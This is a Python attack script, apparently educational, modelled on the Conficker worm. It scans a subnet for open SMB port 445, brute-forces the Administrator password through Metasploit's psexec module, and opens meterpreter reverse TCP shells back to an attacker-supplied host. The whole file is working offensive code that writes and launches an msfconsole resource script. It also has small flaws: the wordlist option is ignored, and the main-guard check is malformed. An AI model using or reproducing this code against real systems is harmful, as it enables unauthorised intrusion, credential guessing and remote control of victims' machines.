#!/usr/bin/python
# written for py-sc.org
# cracking poverty with python

import nmap
import optparse
import os

def targetSelection(targetList,subNet):
	nmapScanner = nmap.PortScanner()
	nmapScanner.scan(subNet, '445')
	targetHosts = []
	for host in nmapScanner.all_hosts():
		if nmapScanner[host].has_tcp(445):
			state = nmapScanner[host]['tcp'][445]['state']
			if state == 'open':
				print '[+] Found Target Host: ' + host
				targetList.write(str(host) + "\n")

def attackerHandler(resourceScript,attackerHost, attackerPort):
	resourceScript.write('use exploit/multi/handler\n')
	resourceScript.write('set payload windows/meterpreter/reverse_tcp\n')
	resourceScript.write('set LPORT ' + str(attackerPort) + '\n')
	resourceScript.write('set LHOST ' + attackerHost + '\n')
	#resourceScript.write('set ExitOnSession false')
	resourceScript.write('exploit -j -z\n')
	resourceScript.write('setg DisablePayloadHandler 1\n')

def bruteForce(resourceScript, targetHost, wordlist, attackerHost, attackerPort):
	userName = 'Administrator'
	wordList = open('wordlist','r')
	for password in wordList.readlines():
		password = password.strip('\n')
		resourceScript.write('use exploit/windows/smb/psexec\n')
		resourceScript.write('set SMBUser ' + str(userName) + '\n')
		resourceScript.write('set SMBPass ' + str(password) + '\n')
		resourceScript.write('set RHOST ' + str(targetHost) + '\n')
		resourceScript.write('set payload windows/meterpreter/reverse_tcp\n')
		resourceScript.write('set LPORT ' + str(attackerPort) + '\n')
		resourceScript.write('set LHOST ' + attackerHost + '\n')
		resourceScript.write('exploit -j -z \n')

def main():

	resourceScript = open('exploit_MS0867.rc','w')
	targetList = open('targetlist','w')
	parser = optparse.OptionParser('[*] Usage: script' + ' -H <Range of Targets> -l <LHOST> [-p <LPORT>]' )
	parser.add_option('-H', dest='targetHost', type='string', help='specify range of target')
	parser.add_option('-p', dest='attackerPort',type='string', help='specify the listen port in attacker machine')
	parser.add_option('-l', dest='attackerHost', type='string', help='specify the attacker address')
	parser.add_option('-W', dest='wordlist', type='string', help='specify the wordlist')

	(options, args) = parser.parse_args()
	if (options.targetHost == None) | (options.attackerHost == None):
		print parser.usage
		exit(0)
	attackerHost = options.attackerHost
	attackerPort = options.attackerPort
	if attackerPort == None:
		attackerPort = '7777'
	wordlist = options.wordlist
	
	print "\n" + "Phase - I: Conficker target selection is in progress ... " + "\n"
	#targetHosts = targetSelection(options.targetHost)
	targetSelection(targetList, options.targetHost)
	targetList.close()
	targetVictim = open('targetlist','r')
	print "\n" + "Phase - I: Conficker target selection is finished .." + "\n"
	attackerHandler(resourceScript, attackerHost, attackerPort)

	for targetHost in targetVictim.readlines():
		bruteForce(resourceScript, targetHost, wordlist, attackerHost, attackerPort)		

	resourceScript.close()
	print "\n" + "Phase III: Brute Forcing SMB is in progress ..." + "\n"
	os.system('msfconsole -r exploit_MS0867.rc')
	print "\n" + "Phase III: Brute Forcing SMB is finished ..." + "\n"

if __name__ == main():
	main()
